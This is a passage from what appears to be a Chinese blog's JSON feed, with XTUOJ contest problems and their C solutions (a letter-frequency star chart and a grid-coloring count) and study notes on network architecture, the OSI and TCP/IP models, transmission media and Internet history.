            "content_html": "<h1 id=\"diagram\"><a class=\"anchor\" href=\"#diagram\">#</a> Diagram</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>给你一个字符串，请统计各个字符出现的个数，并使用字符打印一幅统计图表。</p>\n<p>图表的格式是</p>\n<p>1.x 轴是字符，y 轴是字符出现个数<br>\n 2.x 轴的字符为字符串中出现过的字符，并按字典顺序排列<br>\n 3.y 轴中的出现次数使用'<em>' 表示。为了让图表不至于太长，一个'</em>' 表示的数量要尽可能的大。<br>\n4. 每行的行末不允许多余的空格。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>存在多个测试用例，处理到文件末尾。<br>\n每行一个只含英文大写字母的字符串，长度不超过 1000。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果，每个结果之后有一个空行。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AABBCC</span><br><span class=\"line\">AAAABBBBCC</span><br><span class=\"line\">AABBBBDDDE</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">***</span><br><span class=\"line\">ABC</span><br><span class=\"line\"></span><br><span class=\"line\">**</span><br><span class=\"line\">***</span><br><span class=\"line\">ABC</span><br><span class=\"line\"></span><br><span class=\"line\"> *</span><br><span class=\"line\"> **</span><br><span class=\"line\">***</span><br><span class=\"line\">****</span><br><span class=\"line\">ABDE</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"提示\"><a class=\"anchor\" href=\"#提示\">#</a> 提示</h2>\n<p>第一个样例，ABC 都是出现 2 次，所以我们可以用一个星号表示出现 2 次。<br>\n第二个样例的第一行坐标 C 的位置是行末，没有空格，是回车。ABC 分别出现 4，4，2 次，所以使用一个星号表示出现 2 次<br>\n第三个样例没有 C 字符，所有没有 C 字符的统计信息。第 1,2 行的 A 字符位置是空格。</p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">int gnum(int a,int b)//求最大公因数 </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(b == 0)</span><br><span class=\"line\">        return a;</span><br><span class=\"line\">    else</span><br><span class=\"line\">        return gnum(b,a%b);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char qzx[1009];//存入输入的字符串 </span><br><span class=\"line\">    int i,j,n,m,max;</span><br><span class=\"line\">    while(scanf(&quot;%s&quot;,qzx) != EOF)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //printf(&quot;1&quot;);</span><br><span class=\"line\">        int letter[27]=&#123;0&#125;;</span><br><span class=\"line\">        for(i=0;qzx[i] != &#x27;\\0&#x27;;i++)//求总数量 </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            //printf(&quot;1&quot;);</span><br><span class=\"line\">            letter[qzx[i]-65]++;//相应字母的数量（字典序） </span><br><span class=\"line\">            n = letter[qzx[i]-65];//初始化 </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i=0;i&lt;26;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if(letter[i] == &#x27;\\0&#x27;)//有的字母未出现 </span><br><span class=\"line\">                continue;</span><br><span class=\"line\">            n = gnum(letter[i],n);//判断总的公因数 </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i=0;i&lt;26;i++)</span><br><span class=\"line\">            letter[i] = letter[i]/n;//不要取余！！！！！！ </span><br><span class=\"line\">        max = letter[0];</span><br><span class=\"line\">        for(i=0;i&lt;26;i++)//找出数量最多的一个字母，代表高度 </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if(letter[i]&gt;max)</span><br><span class=\"line\">                max = letter[i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i=max;i&gt;0;i--)//控制层数 </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            m = 0;</span><br><span class=\"line\">            for(j=0;j&lt;26&amp;&amp;m!=26;j++)//输出每一行的空格和星号 </span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                if(letter[j] == &#x27;\\0&#x27;) //遇到不在字符串的字母就跳过 </span><br><span class=\"line\">                    continue;</span><br><span class=\"line\">                else if(letter[j] &gt;= i)//大于等于数量最多的那个字母（也就是该层会输出星号） </span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    printf(&quot;*&quot;);</span><br><span class=\"line\">                    /*printf(&quot;1&quot;);*/</span><br><span class=\"line\">                    </span><br><span class=\"line\">                    for(m=j+1;m&lt;26;m++)//防止行尾多余空格的出现，否则PE </span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        if(letter[m]&lt;i)</span><br><span class=\"line\">                            continue;</span><br><span class=\"line\">                        else</span><br><span class=\"line\">                            break;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    </span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                else//如果没有输出空格 </span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    printf(&quot; &quot;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            printf(&quot;\\n&quot;);//进入下一行 </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i=0;i&lt;26;i++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                if(letter[i] == &#x27;\\0&#x27;)</span><br><span class=\"line\">                    continue;</span><br><span class=\"line\">                else</span><br><span class=\"line\">                    printf(&quot;%c&quot;,i+65);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        printf(&quot;\\n\\n&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/26/XTUOJ-1271Color/",
            "url": "https://mangpumo.github.io/2022/11/26/XTUOJ-1271Color/",
            "title": "XTUOJ_1271Color",
            "date_published": "2022-11-26T00:53:15.000Z",
            "content_html": "<h1 id=\"color\"><a class=\"anchor\" href=\"#color\">#</a> Color</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>Alice 在玩一个游戏，她在一个 m×n 的格子里，随机涂黑 k 个格子。然后她每次可以把一行或者一列的格子染成红色，但是这一行中不能有黑色的格子。 请问她最多能把多少个格子涂成红色？</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行是一个整数 T (T≤100)，表示样例的个数。 每个样例的第一行是 m (1≤m≤100),n (1≤n≤100),k (0≤k≤m×n)。 以后的 k 行，每行两个整数 x (1≤x≤m),y (1≤y≤n)，表示 (x,y) 为黑色格子。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">3 4 2</span><br><span class=\"line\">1 1</span><br><span class=\"line\">3 3</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int T;</span><br><span class=\"line\">    int a[101],b[101];</span><br><span class=\"line\">    //memset(a,0,sizeof(a));</span><br><span class=\"line\">    //memset(b,0,sizeof(b));</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;T);</span><br><span class=\"line\">    while(T--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        memset(a,0,sizeof(a));</span><br><span class=\"line\">        memset(b,0,sizeof(b));</span><br><span class=\"line\">        int m,n,k;</span><br><span class=\"line\">        int i,j,aa,bb;</span><br><span class=\"line\">        scanf(&quot;%d %d %d&quot;,&amp;m,&amp;n,&amp;k);//存数据</span><br><span class=\"line\">        for(i=0;i&lt;k;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            scanf(&quot;%d %d&quot;,&amp;aa,&amp;bb);</span><br><span class=\"line\">             a[aa] = 1;</span><br><span class=\"line\">             b[bb] = 1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        int countx=0,county=0;</span><br><span class=\"line\">        for(i=1;i&lt;=m;i++)//没有黑色的行</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if(a[i]==0)</span><br><span class=\"line\">                countx++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        int s;</span><br><span class=\"line\">        s = countx*n;</span><br><span class=\"line\">        for(i=1;i&lt;=n;i++)//没有黑色的列</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if(b[i]==0)</span><br><span class=\"line\">                county++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        s = s+county*m-countx*county;//减去交叉地带</span><br><span class=\"line\">        printf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/",
            "url": "https://mangpumo.github.io/2022/11/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/",
            "title": "计算机网络体系结构",
            "date_published": "2022-11-25T14:24:32.000Z",
            "content_html": "<h1 id=\"计算机网络体系结构\"><a class=\"anchor\" href=\"#计算机网络体系结构\">#</a> 计算机网络体系结构</h1>\n<h2 id=\"21-常用的计算机网络体系结构\"><a class=\"anchor\" href=\"#21-常用的计算机网络体系结构\">#</a> 2.1 常用的计算机网络体系结构</h2>\n<h3 id=\"211-osi体系结构\"><a class=\"anchor\" href=\"#211-osi体系结构\">#</a> 2.1.1 OSI 体系结构</h3>\n<p>1、为了使不同体系结构的计算机网络都能够互联，国际标准化组织于 1977 年成立了专门机构研究该问题，不久他们就提出了一个试图使各种计算机在世界范围内都能够互连成网的标准框架，也就是著名的 “<strong>开放系统互连参考模型</strong>”，<strong>简称为 OSI，OSI 体系结构有时候我们也称之为 OSI 模型</strong>。</p>\n<p>2、OSI 是一个<strong>七层协议</strong>的体系结构：从下往上依次是<strong>物理层、数据链路层、网络层、运输层、会话层、表示层、应用层</strong>。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/b844f5a8acdb4f3ba77a8cb67eafff30.png\" alt><br>\n3、OSI 试图达到一种理想境界，即全球计算机网络都遵循这个统一标准，因而全球的计算机将能够很方便地进行互连和交换数据。在 20 世纪 80 年代，许多大公司甚至一些国家的政府机构纷纷表示支持 OSI。当时看来似乎在不久的将来全世界一定会按照 OSI 制定的标准来构造自己的计算机网络。</p>\n<p>4、然而到了 20 世纪 90 年代初期，虽然整套的 OSI 国际标准都已经制定出来了，但由于基于 TCP/IP 的互联网已抢先在全球相当大的范围成功地运行了，而与此同时却几乎找不到有什么厂家生产出符合 OSI 标准的商用产品。因此人们得出这样的结论：<strong>OSI 只获得了一些理论研究的成果，但在市场化方面则事与愿违地失败了</strong>。</p>\n<p><strong>现今规模最大的、覆盖全球的、基于 TCP/IP 的互联网并未使用 OSI 标准。</strong></p>\n<p>5、OSI 失败的原因可归纳为:</p>\n<ul>\n<li>OSI 的专家们缺乏实际经验，他们在完成 OSI 标准时缺乏商业驱动力；</li>\n<li>OSI 的协议实现起来过分复杂，而且运行效率很低；</li>\n<li>OSI 标准的制定周期太长，因而使得按 OSI 标准生产的设备无法及时进入市场；</li>\n<li>OSI 的层次划分不太合理，有些功能在多个层次中重复出现。<br>\n6.<strong>OSI 体系结构是法律上的国际标准， TCP/IP 体系结构是事实上的国际标准</strong></li>\n</ul>\n<h3 id=\"212具有五层协议的体系结构\"><a class=\"anchor\" href=\"#212具有五层协议的体系结构\">#</a> 2.1.2 具有五层协议的体系结构</h3>\n<p>1.TCP/IP 是一个<strong>四层</strong>的体系结构，它包含<strong>应用层、运输层、网际层和网络接口层</strong>（用网际层这个名字是强调这一层是为了解决不同网络的互连问题)。</p>\n<p>2、OSI 的七层协议体系结构概念清楚，理论也比较完整，但是太过于复杂不实用。TCP/IP 体系结构不同，但是现在却得到了非常广泛的应用。</p>\n<p>3、在学习计算机网络的原理时往往采取折中的办法，即综合 OSI 和 TCP/IP 的优点，<strong>采用一种只有五层协议的体系结构</strong>，这样既简洁又能将概念阐述清楚。有时为了方便，也可把最底下两层称为<strong>网络接口层</strong>。<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/e2756b4c1b244b9d862e1eba6e4e80ef.png\" alt></p>\n<p>4、下面我们结合互联网的情况，自上而下地，非常简要的介绍一下各层的主要功能。</p>\n<ul>\n<li>\n<p><strong>应用层（application layer）</strong></p>\n<ul>\n<li>应用层是体系结构中的最高层。应用层的任务是通过应用进程间的交互来完成特定网络应用。应用层协议定义的是应用进程间通信和交互的规则。这里的进程就是指主机中正在运行的程序。对于<strong>不同的网络应用需要有不同的应用层协议</strong>。在互联网中的应用层协议很多，如<strong>域名系统 DNS，支持万维网应用的 HTTP 协议，支持电子邮件的 SMTP 协议</strong>，等等。<strong>我们把应用层交互的数据单元称为报文 (message)</strong>。</li>\n</ul>\n</li>\n<li>\n<p><strong>运输层（transport layer）</strong></p>\n<ul>\n<li>运输层的任务就是负责<strong>向两台主机中进程之间的通信提供通用的数据传输服务</strong>。</li>\n<li>运输层主要使用以下两种协议:\n<ul>\n<li><strong>传输控制协议 TCP (Transmission Control Protocol)</strong>：提供面向连接的、可靠的数据传输服务</li>\n<li><strong>用户数据报协议 UDP (User Datagram Protocol）</strong>：提供无连接的、尽最大努力 (best-effort) 的数据传输服务（不保证数据传输的可靠性)</li>\n</ul>\n</li>\n<li>TCP 和 UDP 协议都有固定的格式，数据在经过运输层时会根据所选择的运输协议在应用层传递过来的数据基础上加上对应协议的头部。</li>\n</ul>\n</li>\n<li>\n<p><strong>网络层（network layer）</strong></p>\n<ul>\n<li>主要作用是实现<strong>两个网络系统之间的数据透明传送</strong>，具体包括<strong>路由选择</strong>，<strong>拥塞控制</strong>和<strong>网际互连</strong>等。</li>\n<li>在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组或包进行传送。在 TCP/IP 体系中，由于网络层使用 IP 协议，因此分组也叫做<strong> IP 数据报</strong>，简称为<strong>数据报</strong>。</li>\n<li>数据在经过网络层时会加上 IP 协议的头部</li>\n</ul>\n</li>\n<li>\n<p><strong>数据链路层（data link layer）</strong></p>\n<ul>\n<li>利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。</li>\n<li><strong>物理层上所传输数据的单位是比特。</strong></li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/1b32f919f9a245369e56542ac6c89cae.png\" alt></p>\n</li>\n</ul>\n<h2 id=\"22-物理层\"><a class=\"anchor\" href=\"#22-物理层\">#</a> 2.2 物理层</h2>\n<h3 id=\"221-物理层的基本概念\"><a class=\"anchor\" href=\"#221-物理层的基本概念\">#</a> 2.2.1 物理层的基本概念</h3>\n<p>1、物理层主要解决在各种传输媒体上传输比特 0 和 1 的问题，进而给数据链路层提供透明传输比特流的服务</p>\n<p>2、由于传输媒体的种类太多（例如<strong>同轴电缆、光纤、无线电波</strong>等），物理连接方式也有很多例如<strong>点对点连接、广播连接</strong>等，因此物理层协议种类也比较多。但是物理层为了解决在各种传输媒体上传输比特 0 和 1 的问题，无论是那种物理层协议都需要满足主以下四个任务：<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/691eefef65b04a50af678f33529edda3.png\" alt></p>\n<h3 id=\"222-传输媒体\"><a class=\"anchor\" href=\"#222-传输媒体\">#</a> 2.2.2 传输媒体</h3>\n<p>1、导引型传输媒体：电磁波被导引沿着固体媒体传播</p>\n<ul>\n<li><strong>同轴电缆</strong><br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/9c5b4fac605c4b8c869bd18b4302497f.png\" alt>\n<ul>\n<li>以从上图看出同轴电缆的各层都是共圆心的，也就是同轴心的</li>\n<li>同轴电缆有两种\n<ul>\n<li><strong>基带同轴电缆</strong>：数字传输，过去用于局域网</li>\n<li><strong>宽带同轴电缆</strong>：模拟传输，目前主要用于有线电视</li>\n</ul>\n</li>\n<li>同轴电缆价格较贵且布线不够灵活和方便，随着集线器的出现，在局域网领域基本上都是采用双绞线作为传输媒体</li>\n</ul>\n</li>\n<li><strong>双绞线</strong>\n<ul>\n<li><strong>双绞线是最常用的传输媒体</strong>，把两根互相绝缘的铜导线放在一起，然后按照一定规则绞合起来就构成了双绞线。</li>\n<li>常用的双绞线包含<strong>八根铜导线</strong>，每两根绞合成一条双绞线，绞合组合如下：\n<ul>\n<li>蓝色线和蓝白双色线绞合</li>\n<li>橙色线和橙白双色线绞合</li>\n<li>绿色线和绿白双色线绞合</li>\n<li>棕色线和棕白双色线绞合</li>\n</ul>\n</li>\n<li>绞合的作用：\n<ul>\n<li>抵御部分来自外界的电磁干扰</li>\n<li>减少相邻导线的电磁干扰</li>\n</ul>\n</li>\n<li>根据有无屏蔽层，双绞线分为：<strong>无屏蔽双绞线</strong>和<strong>屏蔽双绞线</strong>\n<ul>\n<li>无屏蔽<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/ff9dba22158c4bc785a587d5219d4191.png\" alt></li>\n<li>屏蔽双绞线：在双绞线与外层绝缘封套之间有一个<strong>金属屏蔽层</strong><br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/4246f54fcba640798a92a4a76a727ab5.png\" alt></li>\n</ul>\n</li>\n<li>常用的绞合线类别、带宽及典型应用<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/2750e276192c407584373703beb5f0c0.png\" alt></li>\n</ul>\n</li>\n<li><strong>光纤</strong><br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632193000/94132b8f5e5f4fcf86a141a888731198.png\" alt></li>\n</ul>\n<p>看到了广播域</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/",
            "url": "https://mangpumo.github.io/2022/11/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/",
            "title": "计算机网络概述",
            "date_published": "2022-11-24T16:11:34.000Z",
            "content_html": "<h1 id=\"计算机网络概述\"><a class=\"anchor\" href=\"#计算机网络概述\">#</a> 计算机网络概述</h1>\n<h2 id=\"11-计算机网络在信息时代中的作用\"><a class=\"anchor\" href=\"#11-计算机网络在信息时代中的作用\">#</a> 1.1 计算机网络在信息时代中的作用</h2>\n<p>21 世纪的一些重要特征就是数字化、网络化和信息化，它是一个以网络为核心的信息时代。<br>\n思考：大家每天最离不开的一件物品是什么？<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/044baa91182e4645bb08c3670fd09702.png\" alt></p>\n<p>如果没有了网络，没有了互联网，没有了互联网上丰富多彩的信息和应用，人们还会对手机痴迷吗？</p>\n<p>那我们平时所说的网络到底是什么呢？</p>\n<ul>\n<li>网络（Network）由若干结点（Node）和连接这些结点的链路（Link）所组成。 网络中的结点可以是计算机、集线器、交换机或者路由器等。</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/5aa7c393730742919ce57f7f4f8ba36f.png\" alt></p>\n<ul>\n<li>多个网络还可以通过<strong>路由器</strong>互连起来，这样就构成了一个覆盖范围更大的计算机网络。这样的网络称为<strong>互连网 (internetwork 或 internet)</strong></li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/987d822e83204eab8b2e283465a8ea17.png\" alt></p>\n<ul>\n<li>当我们使用一朵云来表示网络时，可能会有两种不同的情况。一种情况如上图所示，用云表示的网络已经包含了和网络相连的计算机。但有时为了讨论问题的方便 (例如，要讨论几个计算机之间如何进行通信)，也可以把有关的计算机画在云的外面，如下图所示。习惯上，与网络相连的计算机常称为<strong>主机 (host)</strong>。这样，用云表示的互连网里面就只剩下许多路由器和连接这些路由器的链路了。</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/41570dd769fa42d2bf77675844c98d0f.png\" alt></p>\n<ul>\n<li><strong>因特网 (Internet)</strong> 是世界上最大的互连网络 (用户数以亿计，互连的网络数以百万计)</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/8c927e38c5434f0089e2fbd22967f24b.png\" alt></p>\n<ul>\n<li>internet 和 Internet 的区别</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/0641710afa054100a8bfd54f9b453991.png\" alt></p>\n<h2 id=\"12-因特网发展的三个阶段\"><a class=\"anchor\" href=\"#12-因特网发展的三个阶段\">#</a> 1.2 因特网发展的三个阶段</h2>\n<p>因特网的基础结构大致经历了如下三个阶段的演进：<br>\n<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/b94407ab2b77463a8da5ae209603a566.png\" alt><br>\n<strong>第一阶段：1969 年出现了美国军用计算机网 ARPANET (“阿帕网”)</strong>，也就是今天互联网的雏形。<strong>数据集中式处理，数据处理和通信处理都是通过主机完成</strong>。</p>\n<p>当时的阿帕网仅连接四个结点，<strong>传输速率低</strong>，因为当时的计算机图形界面没有发展起来，信息的只能通过文字终端进行展示，<strong>没应用场景</strong>。</p>\n<p>1969 年四个节点的分布位置。分别是</p>\n<ul>\n<li>加州大学洛杉矶分校 --- UCLA</li>\n<li>加州大学圣巴巴拉分校 --- UCSB</li>\n<li>斯坦福研究所 ---SRI</li>\n<li>犹他大学 --- Utah</li>\n</ul>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/402/1637632112000/afa10f42230e410e953ef9ed3681e024.png\" alt><br>\n<strong>1983 年，TCP/IP 协议</strong>成为 ARPANET 的标准协议，因此人们将 1983 年认为是 Internet 的诞生时间。</p>\n<p><strong>第二阶段：建成了三级结构的互联网</strong>。从 1985 年起，美国国家科学基金会 NSF (National Science Foundation) 就围绕六个大型计算机中心建设计算机网络，即国家科学基金网 NSFNET，它是一个三级计算机网络，分为<strong>主干网、地区网和校园网 (或企业网)</strong>。这种三级计算机网络覆盖了全美国主要的大学和研究所，并且成为互联网中的主要组成部分。1991 年，NSF 和美国的其他政府机构开始认识到，互联网必将扩大其使用范围，不应仅限于大学和研究机构。世界上的许多公司纷纷接入到互联网，网络上的通信量急剧增大，使互联网的容量已满足不了需要。于是美国政府决定将互联网的主干网转交给私人公司来经营，并开始对接入互联网的单位收费。1992 年互联网上的主机超过 100 万台。1993 年互联网主干网的速率提高到 45 Mbit/s (T3 速率)。</p>\n<p><strong>第三阶段：逐渐形成了多层次 ISP 结构的互联网</strong>。从 1993 年开始，由美国政府资助的 NSFNET 逐渐被若千个商用的互联网主干网替代，而政府机构不再负责互联网的运营。这样就出现了 - 一个新的名词：<strong>互联网服务提供者 ISP (Internet Service Provider)</strong>。在许多情况下，ISP 就是一个进行商业活动的公司，因此 ISP 又常译为互联网服务提供商。例如，中国电信、中国联通和中国移动等公司都是我国最有名的 ISP。</p>\n<ul>\n<li>互联网服务提供者 ISP (Internet Service Provider)\n<ul>\n<li>ISP 可以从互联网管理机构申请到很多 IP 地址（互联网上的主机都必须有 IP 地址才能上网），同时拥有通信线路 (大 ISP 自己建造通信线路，小 ISP 则向电信公司租用通信线路) 以及路由器等连网设备，因此任何机构和个人只要向某个 ISP 交纳规定的费用，就可从该 ISP 获取所需 IP 地址的使用权，并可通过该 ISP 接入到互联网。</li>\n</ul>\n</li>\n</ul>\n<p><img 